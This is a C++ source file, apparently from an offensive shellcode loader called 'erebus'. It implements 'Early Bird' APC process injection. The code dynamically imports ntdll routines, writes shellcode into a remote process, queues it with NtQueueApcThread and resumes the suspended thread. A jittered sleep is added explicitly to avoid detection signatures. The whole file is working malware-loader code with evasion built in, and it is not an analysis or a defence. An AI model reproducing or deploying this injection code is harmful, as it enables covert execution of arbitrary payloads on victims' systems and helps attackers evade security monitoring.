#include "../../include/loader.hpp"

namespace erebus {
// CONFIG_INJECTION_TYPE == 5 — vanilla NtQueueApcThread (Remote, Early Bird).
//
// Sibling of `injection_earlycascade.cpp` (type 3). Both queue an APC to a
// suspended thread in a remote process, but this variant adds a jittered
// 800-1200ms Sleep after NtResumeThread so the APC actually fires before
// the loader tears down the process/thread handles. The EarlyCascade
// variant has a known race where rapid handle close can pre-empt the APC.
//
// Pre-fix this file was incorrectly gated on `== 1`, which meant it
// compiled into every NtMapViewOfSection build as dead code (the dispatch
// table for type 1 routes to InjectionNtMapViewOfSection, never to this).
// The orphan was never exposed in the builder UI either, so the
// implementation was unreachable in every shipped binary. Now exposed as
// the real type-5 selection.
#if CONFIG_INJECTION_TYPE == 5
	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. NtQueueApcThread");

		PVOID base_address = NULL;
		NTSTATUS status;

		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
		ImportFunction(ntdll, NtClose, typeNtClose);

		if (!shellcode || shellcode_size == 0)
		{
			LOG_ERROR("Invalid shellcode parameters");
			return;
		}

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		LOG_SUCCESS("Shellcode written to memory at: 0x%p", base_address);

		// Queue APC to execute shellcode
		status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08lX)", status);
			return;
		}

		LOG_SUCCESS("APC queued successfully");

		// Resume thread to execute APC
		ULONG suspend_count = 0;
		status = NtResumeThread(hThread, &suspend_count);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08lX)", status);
			return;
		}

		LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspend_count);

		// Jittered delay for APC execution - avoids fixed-interval detection signatures
		Sleep(800 + (GetTickCount() % 400));

		NtClose(hThread);
		NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
#endif
} // namespace erebus
